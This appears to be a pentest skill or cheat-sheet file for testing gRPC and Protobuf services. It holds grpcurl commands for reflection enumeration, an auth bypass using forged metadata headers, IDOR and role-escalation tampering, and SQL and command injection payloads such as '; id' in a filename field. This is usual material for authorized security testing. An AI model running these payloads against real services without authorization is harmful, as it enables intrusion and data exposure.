---
name: grpc-protobuf
description: gRPC and Protocol Buffers security testing covering reflection enumeration, message tampering, metadata auth bypass, and service discovery
---

# gRPC / Protobuf Testing

## Reconnaissance

### Service Discovery

```bash
# gRPC reflection — list all services
grpcurl -plaintext TARGET:50051 list
grpcurl -plaintext TARGET:50051 describe SERVICE_NAME

# Without reflection — enumerate common service names
for svc in health.v1.Health grpc.reflection.v1.ServerReflection; do
  grpcurl -plaintext TARGET:50051 "$svc/Check" 2>/dev/null && echo "[FOUND] $svc"
done

# gRPC over HTTP/2 detection
curl -sk --http2 https://TARGET/ -H "Content-Type: application/grpc" -D -
```

### Method Enumeration

```bash
# List all methods of a service
grpcurl -plaintext TARGET:50051 describe UserService

# Call methods with empty message
grpcurl -plaintext TARGET:50051 UserService/GetUser

# Call with test data
grpcurl -plaintext -d '{"id": 1}' TARGET:50051 UserService/GetUser
grpcurl -plaintext -d '{"id": 1}' TARGET:50051 UserService/GetUser
```

## Key Vulnerabilities

### Authentication Bypass via Metadata

```bash
# Test without auth
grpcurl -plaintext TARGET:50051 AdminService/ListUsers

# Test with forged metadata
grpcurl -plaintext -H "authorization: Bearer fake_token" TARGET:50051 AdminService/ListUsers
grpcurl -plaintext -H "x-user-role: admin" TARGET:50051 AdminService/ListUsers
```

### Message Tampering

```bash
# Modify fields for IDOR
grpcurl -plaintext -d '{"user_id": 2}' TARGET:50051 UserService/GetProfile
# Change role/permissions in update messages
grpcurl -plaintext -d '{"user_id": 1, "role": "admin"}' TARGET:50051 UserService/UpdateUser
```

### Injection via String Fields

```bash
# SQLi in string fields
grpcurl -plaintext -d '{"query": "'\'' OR 1=1--"}' TARGET:50051 SearchService/Search
# Command injection
grpcurl -plaintext -d '{"filename": "; id"}' TARGET:50051 FileService/Download
```

## Pro Tips

1. Install `grpcurl` — it's the `curl` equivalent for gRPC: `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest`
2. gRPC reflection is like having Swagger for free — if enabled, you see ALL services and messages
3. gRPC runs on HTTP/2 — test with `--http2` flag in curl for detection
4. Most gRPC services lack proper authorization on individual methods — test IDOR and role bypass
5. Protobuf messages are typed — but string fields are still injectable (SQLi, command injection)
6. gRPC-Web runs over HTTP/1.1 — test endpoints at `/grpc-web/ServiceName/MethodName`
